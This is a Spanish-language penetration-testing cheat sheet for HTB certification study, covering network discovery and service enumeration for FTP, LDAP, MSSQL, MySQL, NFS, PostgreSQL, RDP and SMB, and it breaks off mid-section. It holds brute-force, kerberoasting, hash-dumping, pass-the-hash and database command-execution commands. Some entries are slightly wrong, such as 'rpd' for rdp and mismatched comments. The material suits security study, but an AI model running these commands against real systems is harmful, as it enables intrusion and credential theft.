![](/images/CPTS.jpg)

# HTB CERTIFIED PENETRATION TESTING SPECIALIST

## Information Gathering

### Fping

```bash
fping -asgq 172.16.0.1/24
```

Parámetros utilizados:

- `a` para mostrar los objetivos que están activos
- `s` imprimir estadísticas al final de la exploración
- `g` para generar una lista de destinos a partir de la red CIDR
- `q` para no mostrar resultados por objetivo

### Nmap

#### Descubrimiento de host - Ping Scan

```bash
sudo nmap -sn <TARGET-RANGE>

# Ejemplo
sudo nmap -sn 192.168.56.1/24
```

- `-sn` Esta opción le dice a Nmap que no haga un escaneo de puertos después del descubrimiento de hosts y que sólo imprima los hosts disponibles que respondieron a la traza icmp.

#### Escaneo de puertos

```bash
sudo nmap -p- --open -Pn -n <RHOST> -oG openPorts -vvv
```

Parámetros utilizados:

- `-sS`: Realiza un TCP SYN Scan para escanear de manera sigilosa, es decir, que no completa las conexiones TCP con los puertos de la máquina víctima.
- `-p-`: Indica que debe escanear todos los puertos (es igual a `-p 1-65535`).
- `--open`: Muestra solo los puertos que están abiertos, excluyendo los cerrados.
- `--min-rate 5000`: Establece el número mínimo de paquetes que nmap enviará por segundo.
- `-Pn`: Desactiva la detección de hosts (no realiza un ping previo). Esto es útil si el host tiene el ICMP (ping) bloqueado.
- `-n`: Desactiva la resolución de nombres DNS, lo que acelera el escaneo porque no intenta resolver las direcciones IP a nombres de dominio.
- `-oG`: Determina el formato del archivo en el cual se guardan los resultados obtenidos. En este caso, es un formato _grepeable_, el cual almacena todo en una sola línea. De esta forma, es más sencillo procesar y obtener los puertos abiertos por medio de expresiones regulares, en conjunto con otras utilidades como pueden ser grep, awk, sed, entre otras.
- `-vvv`: Activa el modo _verbose_ para que nos muestre resultados a medida que los encuentra.

#### Versión y Servicio

```bash
sudo nmap -sCV -p<PORTS> <RHOST> -oN servicesScan -vvv 
```

- `-sCV` Es la combinación de los parámetros `-sC` y `-sV`. El primero determina que se utilizarán una serie de scripts básicos de enumeración propios de nmap, para conocer el servicio que esta corriendo en dichos puertos. Por su parte, segundo parámetro permite conocer más acerca de la versión de ese servicio.
- `-p-`: Indica que debe escanear todos los puertos (es igual a `-p 1-65535`).
- `-oN`: Determina el formato del archivo en el cual se guardan los resultados obtenidos. En este caso, es el formato por defecto de nmap.
- `-vvv`: Activa el modo _verbose_ para que nos muestre resultados a medida que los encuentra.

#### UDP (top 100)

```bash
sudo nmap -n -v -sU -F -T4 --reason --open -T4 -oA nmap/udp-fast <RHOST>
```

#### UDP (top 20)

```bash
sudo nmap -n -v -sU -T4 --top-ports=20 --reason --open -oA nmap/udp-top20 <RHOST>
```

#### Obtener ayuda sobre scripts

```bash
nmap --script-help="http-*"
```

#### Listar scripts de Nmap

```bash
locate -r '\.nse$' | xargs grep categories | grep categories | grep 'default\|version\|safe' | grep smb
```

### Descubrimiento de hosts Windows CMD

```powershell
arp -d
for /L %a (1,1,254) do @start /b ping 40.40.40.%a -w 100 -n 2 >nul
arp -a
```

### Descubrimiento de hosts Windows PowerShell

```powershell
1..254 | % {"172.16.5.$($_): $(Test-Connection -count 1 -comp 172.16.5.$($_) -quiet)"}
```

### Descubrimiento de hosts Linux

```bash
for i in $(seq 1 254); do ping -c 1 192.168.50.$i &>/dev/null && echo "[+] Host 192.168.50.$i - ACTIVE"; done
```

```bash
for i in {1..254} ;do (ping -c 1 172.16.5.$i | grep "bytes from" &) ;done
```

```bash
#!/bin/bash

octetos=$(echo "$1" | grep -oE '([0-9]{1,3}\.){2}[0-9]{1,3}')

for i in $(seq 1 254); do
    timeout 1 bash -c "ping -c 1 $octetos.$i" &>/dev/null && echo "[+] Host $octetos.$i - ACTIVE" &
done; wait
```

```bash
./hostDiscovery.sh 192.168.56
```

### Descubrimiento de hosts Linux (alternativa)

Si la máquina no cuenta con la utilidad `ping`, podemos utilizar el siguiente script como alternativa:

```bash
#!/bin/bash

octetos=$(echo "$1" | grep -oE '([0-9]{1,3}\.){2}[0-9]{1,3}')
 
for i in $(seq 1 254); do
    timeout 1 bash -c "echo >/dev/tcp/$octetos.$i/80" &>/dev/null && echo "[+] Host $octetos.$i - ACTIVE" &
done
wait
```

```bash
./hostDiscovery.sh 192.168.56
```

### Descubrimiento de puertos abiertos Linux

```bash
#!/bin/bash

for port in $(seq 1 65535); do
    timeout 1 bash -c "echo '' > /dev/tcp/$1/$port" 2>/dev/null && echo "[+] Port $port - OPEN" &
done; wait
```

```bash
./portDiscovery.sh <RHOST>
```

### Escaneo de puertos a través de proxychains usando hilos

```bash
seq 1 65535 | xargs -P 500 -I {} proxychains nmap -sT -p{} -open -T5 -Pn -n <RHOST> -vvv -oN servicesScan 2>&1 | grep "tcp open"
```

## Servicios Comunes

### FTP (21)

El Protocolo de Transferencia de Archivos (FTP, por sus siglas en inglés) es un protocolo de red utilizado para la transferencia de archivos entre sistemas que están conectados a una red TCP/IP, basado en una arquitectura _cliente-servidor_. Este protocolo permite la transmisión eficiente de archivos a través de la red, proporcionando servicios de autenticación y control de acceso.

Por defecto, el puerto asignado para la comunicación FTP es el puerto 21.

#### Nmap

Cuando lanzamos una enumeración usando Nmap, se utilizan por defecto una serie de scripts que comprueban si se permite el acceso de forma anonima.

- `anonymous:anonymous`
- `anonymous`
- `ftp:ftp`

```shell
sudo nmap -sCV -p21 <RHOST> -vvv
```

Scripts de `nmap` utiles para este servicio:

- ftp-anon
- ftp-bounce
- ftp-syst
- ftp-brute
- tftp-version

```bash
sudo nmap -p21 --script=ftp-anon <RHOST> -vvv
```

#### Conexión al servidor FTP

```bash
# -A: Esta opción es específica del cliente FTP y suele utilizarse para activar 
# el modo ASCII  de transferencia de archivos. En este modo, los archivos se 
# transfieren en formato de texto, lo que significa que se pueden realizar 
# conversiones de formato (por ejemplo, de CRLF a LF en sistemas Unix).
ftp -A <RHOST>

nc -nvc <RHOST> 21

telnet <RHOST> 21
```

#### Interactuar con el cliente FTP

```bash
ftp> anonymous # usuario
ftp> anonymous # contraseña
ftp> help # mostrar la ayuda
ftp> help CMD # mostrar la ayuda de un comando especifico
ftp> status # descripción general de la configuración del servidor
ftp> binary # establecer la transmisión en binario en lugar de ascii
ftp> ascii # establecer la transmisión a ascii en lugar de binario
ftp> ls -a # lista todos los archivos incluyendo los ocultos
ftp> cd DIR # cambia el directorio remoto
ftp> lcd DIR # cambia el directorio local
ftp> pwd # mostrar el directorio actual de trabajo
ftp> cdup  # mover al directorio anterior de trabajo
ftp> mkdir DIR # crea un directorio
ftp> get FILE [NEWNAME] # descarga un archivo con el nombre indicado NEWNAME
ftp> mget FILE1 FILE2 ... # descarga multiples archivos
ftp> put FILE [NEWNAME] # sube un fichero local a el servidor ftp con el nuevo nombre indicado NEWNANE
ftp> mput FILE1 FILE2 ... # sube multiples archivos
ftp> rename OLD NEW # renombra un archivo remoto
ftp> delete FILE # borra un fichero
ftp> mdelete FILE1 FILE2 ... # borra multiples archivos
ftp> mdelete *.txt # borra multiples archivos que cumplan con el patrón
ftp> exit # abandona la conexión ftp
```

#### Netexec

```bash
# Conectar a un servidor FTP con un usuario y contraseña especificados
nxc ftp <target> -u <user> -p <password>

# Conectar a un servidor FTP con usuario anónimo (sin contraseña)
nxc ftp <target> -u 'anonymous' -p ''

# Conectar a un servidor FTP especificando un puerto diferente al predeterminado
nxc ftp <target> -u <user> -p <password> --port <PORT>

# Listar el contenido del directorio raíz del servidor FTP
nxc ftp <target> -u <user> -p <password> --ls

# Listar el contenido de un directorio específico en el servidor FTP
nxc ftp <target> -u <user> -p <password> --ls <DIRECTORY>

# Descargar un archivo específico desde el servidor FTP
nxc ftp <target> -u <user> -p <password> --get <FILE>

# Subir un archivo específico al servidor FTP
nxc ftp <target> -u <user> -p <password> --put <FILE>
```

#### Fuerza bruta de credenciales

```bash
hydra -l <USER> -P /usr/share/wordlists/rockyou.txt ftp://<RHOST>
```
#### Archivos de configuración

- `/etc/ftpusers`
- `/etc/vsftpd.conf`
- `/etc/ftp.conf`
- `/etc/proftpd.conf`

#### Descargar archivos

```bash
wget -m ftp://anonymous:anonymous@<RHOST>
```

### LDAP (389)


- `nxc ldap` se usa para interactuar con un servidor LDAP.    
- Las diferentes opciones -u, -p, y -M especifican el usuario, contraseña y módulo de acción, respectivamente.    
- El uso de diferentes módulos (-M) permite realizar tareas como enumeración de usuarios, verificación de vulnerabilidades como Zerologon o PetitPotam, y kerberoasting, entre otras.    
- Las opciones adicionales como --gmsa o --trusted-for-delegation permiten obtener detalles específicos de la configuración de los usuarios y cuentas del dominio.

```bash
# Realizar un escaneo LDAP en el objetivo con el parámetro -user-desc
nxc ldap <target> -u '' -p '' -M -user-desc

# Obtener descripciones de los usuarios en el dominio
nxc ldap <target> -u '' -p '' -M get-desc-users

# Ejecutar un verificador de LDAP para comprobar configuraciones del servidor
nxc ldap <target> -u '' -p '' -M ldap-checker

# Comprobar configuración relacionada con Veeam (Backup/Restauración)
nxc ldap <target> -u '' -p '' -M veeam

# Realizar un escaneo relacionado con 'maq' (probablemente algún tipo de auditoría)
nxc ldap <target> -u '' -p '' -M maq

# Ejecutar pruebas para comprobar configuraciones de ADCS (Active Directory Certificate Services)
nxc ldap <target> -u '' -p '' -M adcs

# Comprobar vulnerabilidad Zerologon (CVE-2020-1472)
nxc ldap <target> -u '' -p '' -M zerologon

# Comprobar vulnerabilidad PetitPotam (CVE-2021-36942)
nxc ldap <target> -u '' -p '' -M petitpotam

# Verificar si hay contraseñas con flag NO PAC (no hace parte del protocolo)
nxc ldap <target> -u '' -p '' -M nopac

# Ejecutar el comando whoami con caché de Kerberos
nxc ldap <target> -u '' -p '' --use-kcache -M whoami

# Enumerar usuarios de dominio habilitados
nxc ldap <target> -u '<username>' -p '<password>' --users

# Enumerar los grupos de dominio del servidor LDAP
nxc ldap <target> -u '<username>' -p '<password>' --groups

# Realizar Kerberoasting y guardar los hashes en el archivo hashes.kerberoasting
nxc ldap <target> -u '<username>' -p '<password>' --kerberoasting hashes.kerberoasting

# Realizar AS-REP Roasting y guardar los hashes en el archivo hashes.asreproast
nxc ldap <target> -u '<username>' -p '<password>' --asreproast hashes.asreproast

# Obtener usuarios con el flag PASSWD_NOTREQD (sin requerir contraseña)
nxc ldap <target> -u '<username>' -p '<password>' --password-not-required

# Obtener usuarios y computadoras con el flag Trusted_for_delegation
nxc ldap <target> -u '<username>' -p '<password>' --trusted-for-delegation

# Buscar objetos con el valor de admisión (admin count) igual a 1
nxc ldap <target> -u '<username>' -p '<password>' --admin-count

# Obtener el SID (Security Identifier) del dominio
nxc ldap <target> -u '<username>' -p '<password>' --get-sid

# Enumerar contraseñas de GMSA (Group Managed Service Accounts)
nxc ldap <target> -u '<username>' -p '<password>' --gmsa

# Enumerar contraseñas de GMSA con clave (key) adicional
nxc ldap <target> -u '<username>' -p '<password>' --gmsa -k

# Convertir un ID específico de GMSA
nxc ldap <target> -u '<username>' -p '<password>' --gmsa-convert-id <ID>

# Desencriptar una cuenta GMSA en LSA (Local Security Authority)
nxc ldap <target> -u '<username>' -p '<password>' --gmsa-decrypt-lsa <ACCOUNT>

# Buscar delegaciones en el servidor LDAP
nxc ldap <target> -u '<username>' -p '<password>' --find-delegation

# Obtener información de red del dominio en todos los objetos
nxc ldap <target> -u '<username>' -p '<password>' -M get-network -o ALL=true

# Ejecutar un escaneo con BloodHound para enumerar relaciones y permisos de delegación
nxc ldap <target> -u '<username>' -p '<password>' --bloodhound -ns <target> -c All

# Ejecutar un escaneo con BloodHound sobre servidor DNS específico, incluyendo la caché de Kerberos
nxc ldap <target> -u '<username>' --use-kcache --bloodhound --dns-tcp --dns-server <target> -c All
```

### MSSQL (1433)

MSSQL, o Microsoft SQL Server, es un sistema de gestión de bases de datos relacional desarrollado por Microsoft. Es utilizado para almacenar y recuperar datos según las necesidades de diferentes aplicaciones, desde pequeñas a grandes empresas. MSSQL ofrece características avanzadas como soporte para transacciones, integridad referencial, seguridad robusta y herramientas de administración y desarrollo. Es conocido por su integración estrecha con otros productos de Microsoft, como .NET Framework y Azure, y utiliza T-SQL (Transact-SQL) como su lenguaje de consulta.

#### Nmap

Scripts de `nmap` utiles para este servicio:

- ms-sql-info
- ms-sql-ntlm-info
- ms-sql-brute
- ms-sql-empty-password
- ms-sql-query
- ms-sql-dump-hashes
- ms-sql-xp-cmdshell

```bash
sudo nmap --script ms-sql-info -p 1433 <RHOST>

# Comprobar autenticación NTLM
sudo nmap --script ms-sql-ntlm-info --script-args mssql.instance-port 1433 <RHOST>

# Enumerar usuarios y contraseña validos para MSSQL
sudo nmap -p 1433 --script ms-sql-brute -script-args userdb=/root/Desktop/wordlist/common_users.txt,passdb=/root/Desktop/wordlist/100-common-passwords.txt <RHOST>

# Comprobar si el usuario "sa" tiene configurada la contraseña como vacía
sudo nmap -p 1433 --script ms-sql-empty-password <RHOST>

# Extraer todos los usuarios con sesión con una consulta sql
sudo nmap -p 1433 --script ms-sql-query --script-args mssql.username=<USER>,mssql.password=<PASSWORD>,ms-sql-query="SELECT * FROM master..syslogins" <RHOST> -oN output.txt

# Ejecutar un comando en la máquina victima usando xp_cmdshell
sudo nmap -p 1433 --script ms-sql-xp-cmdshell --script-args mssql.username=<USER>,mssql.password=<PASSWORD>,ms-sql-xp-cmdshell.cmd="type C:\flag.txt" <RHOST>
```

#### Netexec

```bash
# Realiza una consulta SQL
nxc mssql <RHOST> -u <USER> -p <PASSWORD> -q <SQL_QUERY>

# Ejecuta un comando en el sistema Windows si la opción `xp_cmdshell` esta habilitada para el usuario
nxc mssql <RHOST> -u <USER> -p <PASSWORD> -x <COMMAND>

# Enumera los privilegios para escalar de un usuario estandar a sysadmin
nxc mssql <RHOST> -u <USER> -p <PASSWORD> -M mssql_priv

# Aproveche los privilegios de MSSQL para escalar de un usuario estándar a un sysadmin.
nxc mssql <RHOST> -u <USER> -p <PASSWORD> -M mssql_priv -o ACTION=privesc

# Revertir los privilegios del usuario al usuario estándar.
nxc mssql <RHOST> -u <USER> -p <PASSWORD> -M mssql_priv -o ACTION=rollback

# Obtener un archivo remoto de una carpeta compartida.
nxc mssql <RHOST> -u <USER> -p <PASSWORD> --share <SHARE_NAME> --get-file <REMOTE_FILENAME> <OUTPUT_FILENAME>

# Subir un archivo local en una ubicación remota
nxc mssql <RHOST> -u <USER> -p <PASSWORD> --share <SHARE_NAME> --put-file <LOCAL_FILENAME> <REMOTE_FILENAME>
```
#### Conexión

```powershell
sqlcmd -S <RHOST> -U <USERNAME> -P '<PASSWORD>'
```

```bash
impacket-mssqlclient <USERNAME>@<RHOST>
impacket-mssqlclient <USERNAME>@<RHOST> -windows-auth
impacket-mssqlclient -k -no-pass <RHOST>
impacket-mssqlclient <RHOST>/<USERNAME>:<USERNAME>@<RHOST> -windows-auth
```

```bash
export KRB5CCNAME=<USERNAME>.ccache
impacket-mssqlclient -k <RHOST>.<DOMAIN
```

#### Comandos básicos

```sql
SELECT @@version;
SELECT name FROM sys.databases;
SELECT * FROM <DATABASE>.information_schema.tables;
SELECT * FROM <DATABASE>.dbo.users;
```

#### Mostrar el contenido de una base de datos

```sql
1> SELECT name FROM master.sys.databases
2> go
```

#### Ejecución de código

En MSSQL gracias a la palabra clave `execute`, podemos ejecutar el comando arbitrario en el sistema operativo. Para hacer eso primero tenemos que habilitar la ejecución del comando dentro de la base de datos de la siguiente forma:

```sql
EXECUTE sp_configure 'show advanced options', 1;
RECONFIGURE;
EXECUTE sp_configure 'xp_cmdshell', 1;
RECONFIGURE;
```

De esta forma, ya podemos ejecutar comandos:

```sql
EXECUTE xp_cmdshell 'whoami'
```

### MySQL (3306)

MySQL es un sistema de gestión de bases de datos relacional de código abierto. Es ampliamente utilizado para almacenar, gestionar y recuperar datos en diversas aplicaciones, desde sitios web hasta sistemas empresariales. MySQL es conocido por su alta performance, escalabilidad, y confiabilidad. Ofrece soporte para múltiples usuarios y transacciones simultáneas, y utiliza el lenguaje SQL (Structured Query Language) para la gestión de los datos. MySQL es compatible con numerosas plataformas y se integra fácilmente con lenguajes de programación como PHP, Java y Python.

#### Nmap

Scripts de `nmap` utiles para este servicio:

- mysql-empty-password
- mysql-info
- mysql-databases
- mysql-users
- mysql-variables
- mysql-dump-hashes
- mysql-audit

```bash
# Comprobar si el password de `root` es vacío.
sudo nmap --script=mysql-empty-password -p 3306 <RHOST>

# Mostrar información del servidor de MySQL
sudo nmap --script=mysql-info -p 3306 <RHOST>

# Listar las base de datos
sudo nmap --script=mysql-databases --script-args="mysqluser='root',mysqlpass=''" -p 3306 <RHOST>

# Lista los usuarios de la base de datos
sudo nmap --script=mysql-users --script-args="mysqluser='root',mysqlpass=''" -p 3306 <RHOST>

sudo nmap --script=mysql-variables --script-args="mysqluser='root',mysqlpass=''" -p 3306 <RHOST>

# Dump hashes
sudo nmap --script=mysql-dump-hashes --script-args="username='root',password=''" -p 3306 <RHOST>

sudo nmap -p 3306 --script=mysql-audit --script-args="mysql-audit.username='root',mysql-audit.password='',mysql-audit.filename='/usr/share/nmap/nselib/data/mysql-cis.audit'" <RHOST> -vvv

# Ejecutar una consulta
sudo nmap -p 3306 --script=mysql-query --script-args="query='select * from books.authors;',username='root',password=''" <RHOST> -vvv
```

#### Fuerza bruta

```bash
hydra -l root -P /usr/share/wordlists/rockyou.txt mysql://<RHOST> mysql
```

#### Comandos básicos

```sql
SHOW DATABASES; # listar las bases de datos
USE <DATABASE>; # seleccionar una base de datos
SHOW TABLES; # listar las tablas de una base de datos
DESC <TABLE>; # mostar los campos de una tabla
SHOW CREATE TABLE; # mostrar la estructura de una tabla
SELECT <column_name>,<column_name>,<column_name...> FROM <TABLE>; # listar el contenido de una tabla
SHOW EVENTS; # mostrar los eventos programados
```

### NFS (2049)

**Network File System (NFS)** es un sistema de archivos de red desarrollado por Sun Microsystems y tiene la misma finalidad que SMB. Su propósito es acceder a sistemas de archivos a través de una red como si fueran locales. Sin embargo, utiliza un protocolo totalmente distinto. NFS se utiliza entre sistemas Linux y Unix. Esto significa que los clientes NFS no pueden comunicarse directamente con los servidores SMB. NFS es un estándar de Internet que rige los procedimientos de un sistema de archivos distribuido. Mientras que el protocolo NFS versión 3.0 (NFSv3), en uso desde hace muchos años, autentica el ordenador cliente, esto cambia con NFSv4. Aquí, al igual que con el protocolo SMB de Windows, el usuario debe autenticarse.

> El servicio NFS (Network File System) permite a los sistemas de archivos locales ser accesibles por sistemas remotos a través de una red.

#### Aspectos claves

- **NFS**: Utiliza el puerto 2049 TCP/UDP.
- **Portmapper (rpcbind)**: Utiliza el puerto 111 TCP/UDP para asignar otros puertos dinámicamente.
- **Mountd**: Generalmente usa puertos dinámicos TCP/UDP que son asignados por el Portmapper.
- **Lockd**: Utiliza puertos dinámicos para manejar bloqueo de archivos.
- **Statd**: Utiliza puertos dinámicos para el servicio de notificación de estado.

#### Otros Detalles

- **Protocolos**: NFSv2 (UDP/TCP), NFSv3 (UDP/TCP), NFSv4 (TCP).
- **Autenticación**: Puede usar AUTH_SYS, Kerberos, o autenticación basada en tokens.
- **Seguridad**: Puede integrarse con firewalls y sistemas de autenticación para asegurar las conexiones.

#### Configuración Predeterminada

NFS no es díficil de configurar porque no hay tantas opciones como tienen FTP o SMB. El archivi `/etc/exports` contiene una tabla de sistemas de archivos físicos NFS accesibles por los clientes. La [Tabla de Exportaciones NFS](http://manpages.ubuntu.com/manpages/trusty/man5/exports.5.html) muestra qué opciones acepta y, por lo tanto, indica qué opciones están disponibles para nosotros.

En primer lugar debemos instalar el paquete `nfs-kernel-server` que nos permite trabajar con NFS.


```bash
sudo apt update
sudo apt install nfs-kernel-server
```

#### Archivo `/etc/exports`

El valor predeterminado del archivo `exports` también contiene algunos ejemplos de configuración de recursos compartidos NFS. Primero, la carpeta se especifica y se pone a disposición de otros, y luego los derechos que tendrán en este recurso compartido NFS se conectan a un host o una subred. Finalmente, se pueden agregar opciones adicionales a los hosts o subredes.

![](/images/nfs00.png)

| **Opción**         | **Descripción**                                                                                                                                    |
| ------------------ | -------------------------------------------------------------------------------------------------------------------------------------------------- |
| `rw`               | Permisos de lectura y escritura.                                                                                                                   |
| `ro`               | Permisos de solo lectura.                                                                                                                          |
| `sync`             | Transferencia de datos síncrona. (Un poco más lento)                                                                                               |
| `async`            | Transferencia de datos asíncrona. (Un poco más rápido)                                                                                             |
| `secure`           | No se utilizarán puertos por encima de 1024.                                                                                                       |
| `insecure`         | Se utilizarán puertos por encima de 1024.                                                                                                          |
| `no_subtree_check` | Esta opción deshabilita la comprobación de los árboles de subdirectorio.                                                                           |
| `root_squash`      | Asigna todos los permisos a archivos de root UID/GID 0 al UID/GID de anonymous, lo que impide `root` desde el acceso a archivos en un montaje NFS. |

Creemos dicha entrada para fines de prueba y juguemos con la configuración.

#### Configuración Peligrosa

| **Opción**       | **Descripción**                                                                                                                            |
| ---------------- | ------------------------------------------------------------------------------------------------------------------------------------------ |
| `rw`             | Permisos de lectura y escritura.                                                                                                           |
| `insecure`       | Se utilizarán puertos por encima de 1024.                                                                                                  |
| `nohide`         | Si se montó otro sistema de archivos debajo de un directorio exportado, este directorio se exporta por su propia entrada de exportaciones. |
| `no_root_squash` | Todos los archivos creados por root se mantienen con el UID/GID 0.                                                                         |


#### Footprinting del servicio

```bash
nmap -sSCV -p111,2049 192.168.1.22
```

![NFS](/images/nfs01.png)

El script `rpcinfo` de Nmap recupera una lista de todos los servicios RPC que se ejecutan actualmente, sus nombres y descripciones, y los puertos que utilizan. Esto nos permite verificar si el recurso compartido de destino está conectado a la red en todos los puertos requeridos. Además, para NFS, Nmap tiene algunos scripts NSE que se pueden usar para los escaneos. Estos pueden mostrarnos, por ejemplo, el `contents` de la parte y su `stats`.

![NFS](/images/nfs02.png)

Una vez que hayamos descubierto dicho servicio NFS, podemos montarlo en nuestra máquina local. Para esto, podemos crear una nueva carpeta vacía a la que se montará el recurso compartido NFS. Una vez montado, podemos navegar y ver el contenido al igual que nuestro sistema local.

#### Mostrar las exportaciones del servidor NFS

```bash
showmount -e 192.168.1.22
```

>El comando `showmount` en sistemas Unix/Linux se utiliza para mostrar información sobre las exportaciones NFS y los clientes que están montando esos sistemas de archivos.

#### Montar un recurso NFS

```bash
mkdir target-NFS
mount -t nfs 192.168.1.22:/ ./target-NFS -o nolock
cd target-NFS
tree .
cat mnt/nfs/test.txt
```

#### Desmontar

```bash
sudo umount ./target-NFS
```

### PostgreSQL (5432)

```sql
psql
psql -h <LHOST> -U <USERNAME> -c "<COMMAND>;"
psql -h <RHOST> -p 5432 -U <USERNAME> -d <DATABASE>
psql -h <RHOST> -p 5432 -U <USERNAME> -d <DATABASE>
```

#### Comandos Comunes

```sql
postgres=# \list                                                            // listar todas las bases de datos
postgres=# \c                                                               // seleccionar una base de datos
postgres=# \c <DATABASE>                                                    // seleccionar una base de datos especifica
postgres=# \s                                                               // historial de comandos
postgres=# \q                                                               // salir
<DATABASE>=# \dt                                                            // listar las tablas del schema actual
<DATABASE>=# \dt *.*                                                        // listar las tablas de todos los schema
<DATABASE>=# \du                                                            // listar los roles de usuario
<DATABASE>=# \du+                                                           // listar los roles de usuario
<DATABASE>=# SELECT user;                                                   // mostar el usuario actual
<DATABASE>=# TABLE <TABLE>;                                                 // seleccionar una tabla
<DATABASE>=# SELECT usename, passwd from pg_shadow;                         // Leer credenciales
<DATABASE>=# SELECT * FROM pg_ls_dir('/'); --                               // Leer directorios
<DATABASE>=# SELECT pg_read_file('/PATH/TO/FILE/<FILE>', 0, 1000000); --    // Leer un archivo
```

#### Ejecución Remota de Código

```sql
<DATABASE>=# DROP TABLE IF EXISTS cmd_exec;
<DATABASE>=# CREATE TABLE cmd_exec(cmd_output text);
<DATABASE>=# COPY cmd_exec FROM PROGRAM 'id';
<DATABASE>=# SELECT * FROM cmd_exec;
<DATABASE>=# DROP TABLE IF EXISTS cmd_exec;
```

### RDP (3389)

El protocolo RDP (Remote Desktop Protocol) es un protocolo de red desarrollado por Microsoft que permite a los usuarios conectarse de manera remota a una computadora con Windows. Utiliza el puerto 3389 por defecto y permite que los usuarios controlen una máquina a distancia, viendo su escritorio y utilizando aplicaciones como si estuvieran frente a ella. Es ampliamente utilizado para administración remota y soporte técnico.

#### xfreerdp

```bash
xfreerdp /v:<RHOST> /u:<USERNAME> /p:<PASSWORD> /cert-ignore
xfreerdp /v:<RHOST> /u:<USERNAME> /p:<PASSWORD> /d:<DOMAIN> /cert-ignore
xfreerdp /v:<RHOST> /u:<USERNAME> /p:<PASSWORD> /dynamic-resolution +clipboard
xfreerdp /v:<RHOST> /u:<USERNAME> /d:<DOMAIN> /pth:'<HASH>' /dynamic-resolution +clipboard
xfreerdp /v:<RHOST> /dynamic-resolution +clipboard /tls-seclevel:0 -sec-nla

rdesktop <RHOST>
```

#### Netexec

```bash
# Si NLA está deshabilitado, le permitirá tomar una captura de pantalla del mensaje de inicio de sesión
nxc rpd <RHOST> -u <USER> -p <PASSWORD> --nla-screenshot

# Toma una captura de pantalla del objetivo
nxc rpd <RHOST> -u <USER> -p <PASSWORD> --screenshot

# Enumerar los permisos en todos los recursos compartidos del objetivo
nxc rpd <RHOST> -u <USER> -p <PASSWORD> --screentime <SCREENTIME>

# Enumerar las sesiones activas en el objetivo
nxc rpd <RHOST> -u <USER> -p <PASSWORD> --res <RESOLUTION>
```

### SMB (445)

SMB (Server Message Block) es un protocolo diseñado para la compartición de archivos en red, facilitando la interconexión de archivos y periféricos como impresoras y puertos serie entre ordenadores dentro de una red local (LAN).

- SMB utiliza el puerto 445 (TCP). Sin embargo, originalmente, SMB se ejecutaba sobre NetBIOS utilizando puerto 139.    
- SAMBA es una implementación de código abierto para Linux del protocolo SMB (Server Message Block), que facilita la interoperabilidad entre sistemas Linux y Windows. Permite a los equipos con Windows acceder a recursos compartidos en sistemas Linux, y a su vez, posibilita que dispositivos Linux accedan a recursos compartidos en redes Windows.

El protocolo SMB utiliza dos niveles de autenticación, a saber:

- **Autenticación de usuario**: los usuarios deben proporcionar un nombre de usuario y una contraseña para autenticarse con el servidor SMB para acceder a un recurso compartido.    
- **Autenticación de recurso compartido**: los usuarios deben proporcionar una contraseña para acceder a un recurso compartido restringido.

#### Nmap

Scripts de `nmap` utiles para este servicio:

- smb-ls
- smb-protocols
- smb-security-mode
- smb-enum-sessions
- smb-enum-shares
- smb-enum-users
- smb-enum-groups
- smb-enum-domains
- smb-enum-services

Sintaxis:

```c
sudo nmap -p445 --script <script> <RHOST>
```

#### smbclient

Es un cliente que nos permite acceder a recursos compartidos en servidores SMB.

```bash
# Lista recursos compartidos
smbclient -L <RHOST> -N

# Conexión utilizando una sesión nula
smbclient //<RHOST>/Public -N

# Realiza una conexión con el usuario elliot
smbclient //<RHOST>/Public -U elliot
```
#### smbmap

SMBMap permite a los usuarios enumerar las unidades compartidas samba en todo un dominio. Enumera las unidades compartidas, los permisos de las unidades, el contenido compartido, la funcionalidad de carga/descarga, la coincidencia de patrones de descarga automática de nombres de archivo e incluso la ejecución de comandos remotos.

```bash
# Utiliza un usuario de invitado (guest) con una contraseña en blanco para 
# autenticarse en el objetivo especificado por <RHOST>.
# -d indica el dominio actual.
smbmap -u guest -p "" -d . -H <RHOST>

# Autentica con un usuario y contraseña específicos (<USER> y <PASSWORD>) 
# en el objetivo (<RHOST>).
# -L lista los recursos compartidos disponibles en la máquina.
smbmap -u <USER> -p <PASSWORD> -H <RHOST> -L

# Autentica en el objetivo y muestra la lista de archivos y 
# carpetas en la unidad C$ de forma recursiva.
smbmap -u <USER> -p <PASSWORD> -H <RHOST> -r 'C$'

# Autentica y sube un archivo desde la ubicación local /root/file
# al recurso compartido C$ en el objetivo.
smbmap -H <RHOST> -u <USER> -p <PASSWORD> --upload '/root/file' 'tmp/file'

# Autentica y descarga el archivo 'file' desde el recurso compartido tmp 
# en el objetivo.
smbmap -H <RHOST> -u <USER> -p <PASSWORD> --download 'tmp/file'

# Autentica en el objetivo y ejecuta el comando ipconfig en el sistema remoto 
# usando SMB.
smbmap -u <USER> -p <PASSWORD> -H <RHOST> -x 'ipconfig'
```

#### enum4linux

Enum4linux es una herramienta utilizada para extraer información de hosts de Windows y Samba. La herramienta está escrita en Perl y envuelta en herramientas de samba `smbclient`, `rpcclient`, `net` y `nslookup`.

```bash
# -o indica que se realizará una enumeración básica.
enum4linux -o <RHOST>

# -U indica que se realizará una enumeración de usuarios
enum4linux -U <RHOST>

# -G indica que se realizará una enumeración de grupos 
enum4linux -G <RHOST>

# -S indica que se realizará una enumeración de los recursos compartidos
enum4linux -S <RHOST>

# -i Comprueba si el servidor smb esta configurado para imprimir
enum4linux -i <RHOST>

# -r Intentará enumerar usuarios utilizando RID cycling en el sistema remoto.
# -u Especifica el nombre de usuario que se utilizará para la autenticación. 
# -p Especifica la contraseña asociada al usuario proporcionado con la opción -u.
enum4linux -r -u <user> -p <password> <RHOST>
```

#### Netexec

Netexec, anteriormente conocido como **CrackMapExec (CME)**, es una herramienta de código. que permite automatizar tareas relacionadas con la enumeración y explotación de sistemas Windows y Linux, como la ejecución de comandos remotos, la obtención de credenciales y la evaluación de la seguridad en entornos de redes grandes. Netexec permite realizar tareas de forma masiva en múltiples sistemas a la vez, facilitando la identificación de vulnerabilidades y configuraciones incorrectas en una red.

```bash
# Enumerar hosts
nxc smb <target>/24

# comprobar null sessions
nxc smb <target> -u '' -p ''

# comprobar Guest login
nxc smb <target> -u 'guest' -p ''

# enumerar hosts con firma SMB no requerida
nxc smb <target>/24 --gen-relay-list relay_list.txt

# enumerar recursos compartidos usando una null session
nxc smb <target> -u '' -p '' --shares

# enumerar recursos compartidos de lectura/escritura en múltiples IPs con/sin credenciales
nxc smb <target> -u <user> -p <password> --shares --filter-shares READ WRITE

# enumera sesiones activas en la máquina objetivo
nxc smb <target> -u <user> -p <password> --sessions

# enumera los discos duros
